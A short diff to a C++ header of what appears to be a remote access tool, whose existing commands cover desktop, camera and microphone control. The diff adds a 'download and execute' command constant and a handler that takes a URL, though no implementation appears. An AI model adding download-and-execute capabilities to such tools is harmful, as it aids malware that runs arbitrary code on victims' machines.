@@ -43,6 +43,7 @@ typedef struct LoginInfo
 #define KNEL_DESKTOP					(0xdd04)
 #define KNEL_CAMERA						(0xdd05)
 #define KNEL_MICROPHONE					(0xdd06)
+#define KNEL_DOWNANDEXEC				(0xdd07)
 
 typedef void (*pModuleEntry)(char* szServerAddr,unsigned short uPort,DWORD dwParam);
 
@@ -103,6 +104,7 @@ private:
 	void OnCamera();
 	void OnMicrophone();
 	void OnRestart();
+	void OnDownloadAndExec(WCHAR*szUrl);
 	/*********************************************************************/
 
 public:
